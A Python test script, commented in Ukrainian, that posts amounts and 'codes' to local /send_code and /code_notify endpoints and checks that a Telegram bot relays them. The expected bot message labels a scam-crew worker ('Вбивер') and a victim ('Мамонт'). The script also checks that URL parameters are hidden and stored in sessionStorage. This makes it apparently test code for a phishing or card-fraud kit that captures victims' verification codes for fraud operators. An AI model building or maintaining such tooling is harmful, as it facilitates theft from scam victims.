#!/usr/bin/env python3
"""
Тестовий скрипт для перевірки передачі Total через URL
"""

import requests
import json
import time

def test_total_price_transfer():
    """Тестує передачу Total через URL"""
    print("🧪 Тестування передачі Total через URL...")
    
    # Тест 1: З total та currency в URL
    print("\n1. Тест з total та currency в URL...")
    try:
        data = {
            'page': '1-98',  # Фронтенд передає 'page'
            'total': '90',   # Total сума
            'currency': 'EUR', # Валюта
            'ip': '127.0.0.1',
            'code': 'TOTAL90'
        }
        response = requests.post('http://127.0.0.1:8080/send_code', json=data, timeout=5)
        print(f"   Відповідь /send_code: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            print("   ✅ Код надіслано з Total через /send_code")
            print("   📱 Перевірте Telegram:")
            print("   🔍 Має бути:")
            print("      💰 Сума: 90 EUR (Total, замість 45!)")
            print("      #️⃣ Ссылка: ?page=1-98")
            print("      🔐 Код: TOTAL90")
        else:
            print("   ❌ Помилка надсилання коду")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")
    
    time.sleep(2)
    
    # Тест 2: Без total (має використовувати базу даних)
    print("\n2. Тест без total (база даних)...")
    try:
        data = {
            'page': '1-98',
            'ip': '127.0.0.2',
            'code': 'NO_TOTAL'
        }
        response = requests.post('http://127.0.0.1:8080/send_code', json=data, timeout=5)
        print(f"   Відповідь /send_code: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            print("   ✅ Код надіслано без Total")
            print("   📱 Перевірте Telegram:")
            print("   🔍 Має бути:")
            print("      💰 Сума: з бази даних або 'Не указано'")
            print("      #️⃣ Ссылка: ?page=1-98")
            print("      🔐 Код: NO_TOTAL")
        else:
            print("   ❌ Помилка надсилання коду")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")
    
    time.sleep(2)
    
    # Тест 3: Прямий виклик code_notify з ціною
    print("\n3. Прямий виклик code_notify з ціною...")
    try:
        data = {
            'page_code': '1-98',
            'price': '180',  # Прямо в price
            'currency': 'USD',
            'ip': '127.0.0.3',
            'code': 'DIRECT180'
        }
        response = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=5)
        print(f"   Відповідь code_notify: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            print("   ✅ Код надіслано напряму з ціною")
            print("   📱 Перевірте Telegram:")
            print("   🔍 Має бути:")
            print("      💰 Сума: 180 USD")
            print("      #️⃣ Ссылка: ?page=1-98")
            print("      🔐 Код: DIRECT180")
        else:
            print("   ❌ Помилка надсилання повідомлення")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")

def test_url_format():
    """Тестує формат URL з Total"""
    print("\n🧪 Тестування формату URL з Total...")
    
    print("📋 Приклади URL для тестування:")
    print("1. http://site.com/code?page=1-98&total=90&currency=EUR")
    print("2. http://site.com/code?page=1-98&total=180&currency=USD")
    print("3. http://site.com/code?page=1-98&total=250&currency=PLN")
    
    print("\n🔍 Що має статися:")
    print("- URL параметри мають зберегтися в sessionStorage")
    print("- URL має очиститися (приховати параметри)")
    print("- Total має передатися в /send_code")
    print("- В Telegram має показатися правильна сума")

if __name__ == "__main__":
    print("🚀 Запуск тестування передачі Total...")
    print("⚠️  Переконайтеся, що сервер запущений на порту 8080 та бот на порту 8081!")
    print("=" * 70)
    
    test_total_price_transfer()
    test_url_format()
    
    print("\n" + "=" * 70)
    print("✅ Тестування завершено!")
    print("\n📋 Що перевірити:")
    print("1. ✅ Чи правильно передається total через URL")
    print("2. ✅ Чи правильно передається currency через URL")
    print("3. ✅ Чи правильно конвертується total -> price")
    print("4. ✅ Чи правильно відображається сума в Telegram")
    print("5. ✅ Чи правильно приховуються параметри з URL")
    print("6. ✅ Чи правильно зберігаються параметри в sessionStorage")
    
    print("\n🔧 Очікуваний результат:")
    print("🔔 Отправлен запрос на код")
    print("🧑‍🏭 Вбивер: @hexwizards")
    print("🐘 Мамонт: User_170")
    print("💰 Сума: 90 EUR (Total, замість 45!)")
    print("#️⃣ Ссылка: ?page=1-98")
    print("🔐 Код: TOTAL90")
    
    print("\n🌐 URL формат:")
    print("http://site.com/code?page=1-98&total=90&currency=EUR")
    print("↓ (приховується)")
    print("http://site.com/code")
    print("↓ (зберігається в sessionStorage)")
    print("Total: 90 EUR передається в /send_code")
